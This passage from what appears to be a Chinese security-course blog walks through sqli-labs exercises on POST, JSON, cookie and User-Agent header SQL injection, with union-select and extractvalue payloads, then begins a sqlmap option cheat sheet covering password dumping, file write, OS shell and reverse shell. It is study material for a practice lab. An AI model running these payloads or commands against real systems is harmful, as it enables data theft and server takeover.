查询出字段数为3</p><h2 id="2-2-less-6"><a href="#2-2-less-6" class="headerlink" title="2.2 less 6"></a>2.2 less 6</h2><p>源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-variable">$id</span> LIMIT 0,1&quot;</span>;</span><br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/11/25/9qTPdjeROkhY5rE.png" alt="image-20221111090758354" style="zoom:25%;" /><p>换成了双引号闭合</p><h1 id="3、POST数据提交注入测试"><a href="#3、POST数据提交注入测试" class="headerlink" title="3、POST数据提交注入测试"></a>3、POST数据提交注入测试</h1><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sqlilabs</span> less11<br></code></pre></td></tr></table></figure><h2 id="3-1-less11"><a href="#3-1-less11" class="headerlink" title="3.1 less11"></a>3.1 less11</h2><p>源码：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">@$sql=&quot;<span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;$uname&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;$passwd&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>为了实验方便，回显sql语句：</p><p><img src="https://s2.loli.net/2022/11/25/oQ2XjM8aHJTKGD3.png" alt="image-20221111091623571"></p><p>如图：</p><img src="https://s2.loli.net/2022/11/25/9slvAFxVELGP3Nh.png" alt="image-20221111091736725" style="zoom:25%;" /><p>在bp中抓包</p><img src="https://s2.loli.net/2022/11/25/vBAcmFonUjrZqix.png" alt="image-20221111092213722" style="zoom:33%;" /><p>测试：</p><img src="https://s2.loli.net/2022/11/25/W1xNr4bjeT8RHBY.png" alt="image-20221111092423253" style="zoom: 33%;" /><p>发现可以注入</p><p>查询字段：</p><p><img src="https://s2.loli.net/2022/11/25/vAPVr7XcqKy1ZsJ.png" alt="image-20221125093658144"></p><p><img src="https://s2.loli.net/2022/11/25/w9LtCc3yjgn1deb.png" alt="image-20221111092720877"></p><p><img src="https://s2.loli.net/2022/11/25/BbtR789cFmz5AMh.png" alt="image-20221111092644052" style="zoom: 33%;" /><img src="https://s2.loli.net/2022/11/25/w9LtCc3yjgn1deb.png" alt="image-20221111092720877"></p><p>发现字段数只有俩列</p><p>查询回显字段：</p><img src="https://s2.loli.net/2022/11/25/Onx9P2aLqrAjEfK.png" alt="image-20221111093042771" style="zoom:33%;" /><p>发现第一个字段显示用户名，第二个显示密码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">要回显出字段，首先应该令前一个查询条件为假，这样<span class="hljs-keyword">union</span>之后才会显示第二天<span class="hljs-keyword">select</span>语句结果。<br>或者使用<span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span> 显示出第二条数据，如下图：<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/11/25/wFb2gn1GxjZ7St9.png" alt="image-20221111093304480" style="zoom:33%;" /><p>回显出数据库名，和mysql版本号：</p><img src="https://s2.loli.net/2022/11/25/6l1WBMvbrD3YyOi.png" alt="image-20221111093339377" style="zoom:33%;" /><p>查询出用户，操作系统</p><img src="https://s2.loli.net/2022/11/25/lvkgDMPJm2Bnt9E.png" alt="image-20221111093423979" style="zoom:33%;" /><p>然后就可以使用 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">information_schema.tables  查询表名称<br>information_schema.columns查询表中字段<br>information_schema.schemata查询数据库名称<br></code></pre></td></tr></table></figure><p>查询所有数据库(group_concat())：</p><img src="https://s2.loli.net/2022/11/25/FWCBLzraMKYGnHc.png" alt="image-20221111093911511" style="zoom:33%;" /><p>查询security下的表：</p><img src="https://s2.loli.net/2022/11/25/iUdMaE4scTJo8h5.png" alt="image-20221111094119732" style="zoom: 50%;" /><p>查询users下面的字段：</p><p><img src="https://s2.loli.net/2022/11/25/soUX6mkABYJvney.png" alt="image-20221111094247447"></p><p>查询username、password字段的数据：</p><p><img src="https://s2.loli.net/2022/11/25/ySknmRIdiMzWhsl.png" alt="image-20221111094610329"></p><h1 id="4、JSON注入"><a href="#4、JSON注入" class="headerlink" title="4、JSON注入"></a>4、JSON注入</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-type">JSON</span>注入是指应用程序所解析的<span class="hljs-type">JSON</span>数据来源于不可信赖的数据源，程序没有对这些不可信赖的数据进行验证、过滤，如果应用程序使用未经验证的输入构造 <span class="hljs-type">JSON</span>，则可以更改 <span class="hljs-type">JSON</span> 数据的语义。在相对理想的情况下，攻击者可能会插入无关的元素，导致应用程序在解析 <span class="hljs-type">JSON</span>数据时抛出异常。<br><br>在<span class="hljs-type">JSON</span>中是根据引号（“）、冒号（:）、逗号（,）、花括号（&#123;&#125;）来区分各字符的意义的。如果向<span class="hljs-type">JSON</span>中注入恶意字符，那么<span class="hljs-type">JSON</span>将解析失败。<br><br><span class="hljs-type">JSON</span>注入和<span class="hljs-type">XML</span>注入、<span class="hljs-keyword">SQL</span>注入一样，都需要对影响语句的内容进行转义，如双引号、花括号等。<br></code></pre></td></tr></table></figure><p>和SQL注入一样（只是传入的形式变了），插入注入语句。但要注意一点是对影响json语句的要进行转义，如双引号、花括号等。</p><p><img src="https://s2.loli.net/2022/11/25/Qd5UjWlzZJONuoA.png" alt="image.png"></p><p>注入方式：如果是数字的可以不加  ‘  闭合， 如果是字符的话，加上引号闭合</p><p>JSON格式： 使用双引号 “ “键值对形式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>当需要表示一组值时，JSON 不但能够提高可读性，而且可以减少复杂性。</p><p><strong>值的数组</strong> 形式：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;programmers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>  <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;firstName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Brett&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;lastName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;McLaughlin&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span>       <span class="hljs-string">&quot;brett@newInstance.com&quot;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;firstName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Jason&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;lastName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Hunter&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jason@servlets.com&quot;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;firstName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Elliotte&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;lastName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Harold&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;elharo@macfaq.com&quot;</span> <span class="hljs-punctuation">&#125;</span><br> <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;authors&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>  <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;firstName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Isaac&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;lastName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Asimov&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;genre&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;science fiction&quot;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;firstName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Tad&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;lastName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Williams&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;genre&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;fantasy&quot;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;firstName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Frank&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;lastName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Peretti&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;genre&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;christian fiction&quot;</span> <span class="hljs-punctuation">&#125;</span><br> <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;musicians&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>  <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;firstName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Eric&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;lastName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Clapton&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;instrument&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;guitar&quot;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;firstName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Sergei&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;lastName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Rachmaninoff&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;instrument&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;piano&quot;</span> <span class="hljs-punctuation">&#125;</span><br> <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="5、COOKIE数据提交注入测试"><a href="#5、COOKIE数据提交注入测试" class="headerlink" title="5、COOKIE数据提交注入测试"></a>5、COOKIE数据提交注入测试</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sqlilabs</span> less <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>网站传递参数的方式：</p><table><thead><tr><th><strong>参数类型</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>get型</td><td>一般访问网页的行为</td></tr><tr><td>cookie型 （不是请求方式）</td><td>伴随着所有访问网页的行为</td></tr><tr><td>post型</td><td>上传文件，登陆</td></tr></tbody></table><p><strong>cookie注入原理：</strong>对get传递来的参数进行了过滤，但是忽略了cookie也可以传递参数。</p><p>【cookie注入的原理在于更改本地的cookie，从而利用cookie来提交非法语句。】 </p><table><thead><tr><th>条件</th><th align="center">含义</th></tr></thead><tbody><tr><td>条件1</td><td align="center">程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤</td></tr><tr><td>条件2</td><td align="center">条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了</td></tr></tbody></table><p>通过分析源码可知，当我们使用正确的用户名密码登录成功后，就会产生一个cookie值（记录了username值），再次登录后就会携带这个cookie值，通过cookie查询用户名，但是源码对cookie存在 sql 注入</p><p>源码cookie查询语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;$cookee&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/11/25/5kZOoAV4IQFPtde.png" alt="image-20221111103503806" style="zoom:50%;" /><p>使用正确用户名、密码登录</p><p><img src="https://s2.loli.net/2022/11/25/rnvUALcIQPG3F9e.png" alt="image-20221111103526706"></p><p>成功登录后，抓取到一个数据包携带cookie</p><p>查询到字段数为3</p><img src="https://s2.loli.net/2022/11/25/MPOraCKRGsoA4YN.png" alt="image-20221111103906699" style="zoom: 33%;" /><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">修改cookie参数<br>Cookie: <span class="hljs-attribute">uname</span>=admin&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2 union select database(),user(),version() #<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/11/25/ZQgVsirqkl67Mvo.png" alt="image-20221111104029499"></p><h1 id="6、HTTP头部参数数据注入测试"><a href="#6、HTTP头部参数数据注入测试" class="headerlink" title="6、HTTP头部参数数据注入测试"></a>6、HTTP头部参数数据注入测试</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sqlilabs</span> less <span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><p>分析源码，可以看到，源码对</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">$uagent <span class="hljs-operator">=</span> $_SERVER[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br>$IP <span class="hljs-operator">=</span> $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br>...<br>$<span class="hljs-keyword">insert</span><span class="hljs-operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;<br></code></pre></td></tr></table></figure><p>UA,和ip没有进行限制，可以进行注入。</p><p>也就是说我们通过修改http的头部信息可以达到SQL注入的效果。</p><p>登录之后，修改UA数值为：fuck 可得</p><img src="https://s2.loli.net/2022/11/25/2VHSaUesGZpfw4N.png" alt="image-20221111105655834" style="zoom: 50%;" /><p><img src="https://s2.loli.net/2022/11/25/9UI2h6czwdGkBNQ.png" alt="image-20221111105719610"></p><p>那我们将 user-agent 修改为注入语句呢？<br>将 user-agent 修改为</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-keyword">select</span> @@version),<span class="hljs-number">0</span>x7e)) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/11/25/VHmOiGSINZ8nsWU.png" alt="image-20221111105850994" style="zoom:50%;" /><p>可以看到我们已经得到了版本号。</p><p><img src="https://s2.loli.net/2022/11/25/tpUYKlqZuTyaDAG.png" alt="image-20221111105937233"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小迪-day14(注入类型之提交注入)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)</title>
    <link href="/2023/08/24/%E5%B0%8F%E8%BF%AA-day15(Oracle%EF%BC%8CMongoDB%E3%80%81access%E3%80%81msSQL%E3%80%81postgresql%E6%B3%A8%E5%85%A5)/"/>
    <url>/2023/08/24/%E5%B0%8F%E8%BF%AA-day15(Oracle%EF%BC%8CMongoDB%E3%80%81access%E3%80%81msSQL%E3%80%81postgresql%E6%B3%A8%E5%85%A5)/</url>
    
    <content type="html"><![CDATA[<h1 id="1、sqlmap使用"><a href="#1、sqlmap使用" class="headerlink" title="1、sqlmap使用"></a>1、sqlmap使用</h1><p><img src="https://s2.loli.net/2022/11/25/NO4KTFgb7tQMIE8.png" alt="1344396-20180717215927537-734614556.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs sql">基本操作笔记：<span class="hljs-operator">-</span>u  #注入点 <br><br><span class="hljs-operator">-</span>f  #指纹判别数据库类型 <br><span class="hljs-operator">-</span>b  #获取数据库版本信息 <br><span class="hljs-operator">-</span>p  #指定可测试的参数(?page<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>p &quot;page,id&quot;) <br><span class="hljs-operator">-</span>D &quot;&quot;  #指定数据库名 <br><span class="hljs-operator">-</span>T &quot;&quot;  #指定表名 <br><span class="hljs-operator">-</span>C &quot;&quot;  #指定字段 <br><span class="hljs-operator">-</span>s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：<span class="hljs-operator">-</span>s &quot;xx.log&quot;　　恢复:<span class="hljs-operator">-</span>s &quot;xx.log&quot; <span class="hljs-comment">--resume) </span><br><span class="hljs-comment">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="hljs-comment">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br><span class="hljs-comment">--time-sec=(2,5) #延迟响应，默认为5 </span><br><span class="hljs-comment">--data #通过POST发送数据 </span><br><span class="hljs-comment">--columns        #列出字段 </span><br><span class="hljs-comment">--current-user   #获取当前用户名称 </span><br><span class="hljs-comment">--current-db     #获取当前数据库名称 </span><br><span class="hljs-comment">--users          #列数据库所有用户 </span><br><span class="hljs-comment">--passwords      #数据库用户所有密码 </span><br><span class="hljs-comment">--privileges     #查看用户权限(--privileges -U root) </span><br><span class="hljs-operator">-</span>U               #指定数据库用户 <br><span class="hljs-comment">--dbs            #列出所有数据库 </span><br><span class="hljs-comment">--tables -D &quot;&quot;   #列出指定数据库中的表 </span><br><span class="hljs-comment">--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段 </span><br><span class="hljs-comment">--dump-all            #列出所有数据库所有表 </span><br><span class="hljs-comment">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span><br><span class="hljs-comment">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span><br><span class="hljs-comment">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span><br><span class="hljs-comment">--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span><br><span class="hljs-comment">--os      #指定系统(Linux,Windows) </span><br><span class="hljs-operator">-</span>v  #详细的等级(<span class="hljs-number">0</span><span class="hljs-number">-6</span>) <br>    <span class="hljs-number">0</span>：只显示Python的回溯，错误和关键消息。 <br>    <span class="hljs-number">1</span>：显示信息和警告消息。 <br>    <span class="hljs-number">2</span>：显示调试消息。 <br>    <span class="hljs-number">3</span>：有效载荷注入。 <br>    <span class="hljs-number">4</span>：显示HTTP请求。 <br>    <span class="hljs-number">5</span>：显示HTTP响应头。 <br>    <span class="hljs-number">6</span>：显示HTTP响应页面的内容 <br><span class="hljs-comment">--privileges  #查看权限 </span><br><span class="hljs-comment">--is-dba      #是否是数据库管理员 </span><br><span class="hljs-comment">--roles       #枚举数据库用户角色 </span><br><span class="hljs-comment">--udf-inject  #导入用户自定义函数（获取系统权限） </span><br><span class="hljs-comment">--union-check  #是否支持union 注入 </span><br><span class="hljs-comment">--union-cols #union 查询表记录 </span><br><span class="hljs-comment">--union-test #union 语句测试 </span><br><span class="hljs-comment">--union-use  #采用union 注入 </span><br><span class="hljs-comment">--union-tech orderby #union配合order by </span><br><span class="hljs-comment">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="hljs-comment">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) </span><br><span class="hljs-comment">--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) </span><br><span class="hljs-comment">--user-agent &quot;&quot;  #自定义user-agent </span><br><span class="hljs-comment">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span><br><span class="hljs-comment">--string=&quot;&quot;    #指定关键词,字符串匹配. </span><br><span class="hljs-comment">--threads 　　  #采用多线程(--threads 3) </span><br><span class="hljs-comment">--sql-shell    #执行指定sql命令 </span><br><span class="hljs-comment">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span><br><span class="hljs-comment">--file-read    #读取指定文件 </span><br><span class="hljs-comment">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span><br><span class="hljs-comment">--file-dest    #要写入的文件绝对路径 </span><br><span class="hljs-comment">--os-cmd=id    #执行系统命令 </span><br><span class="hljs-comment">--os-shell     #系统交互shell </span><br><span class="hljs-comment">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span><br><span class="hljs-comment">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span><br><span class="hljs-comment">--os-smbrelay  # </span><br><span class="hljs-comment">--os-bof       # </span><br><span class="hljs-comment">--reg-read     #读取win系统注册表 </span><br><span class="hljs-comment">--priv-esc     # </span><br><span class="hljs-comment">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 </span><br><span class="hljs-operator">-</span>p &quot;user-agent&quot; <span class="hljs-comment">--user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span><br><span class="hljs-comment">--eta          #盲注 </span><br><span class="hljs-operator">/</span>pentest<span class="hljs-operator">/</span>database<span class="hljs-operator">/</span>sqlmap<span class="hljs-operator">/</span>txt<span class="hljs-operator">/</span><br>common<span class="hljs-operator">-</span>columns.txt　　字段字典　　　 <br>common<span class="hljs-operator">-</span>outputs.txt <br>common<span class="hljs-operator">-</span>tables.txt      表字典 <br>keywords.txt <br>oracle<span class="hljs-operator">-</span><span class="hljs-keyword">default</span><span class="hljs-operator">-</span>passwords.txt <br><span class="hljs-keyword">user</span><span class="hljs-operator">-</span>agents.txt <br>wordlist.txt <br><br>常用语句 :<br><span class="hljs-number">1.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>f <span class="hljs-operator">-</span>b <span class="hljs-comment">--current-user --current-db --users --passwords --dbs -v 0 </span><br><span class="hljs-number">2.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>b <span class="hljs-comment">--passwords -U root --union-use -v 2 </span><br><span class="hljs-number">3.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>b <span class="hljs-comment">--dump -T users -C username -D userdb --start 2 --stop 3 -v 2 </span><br><span class="hljs-number">4.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span 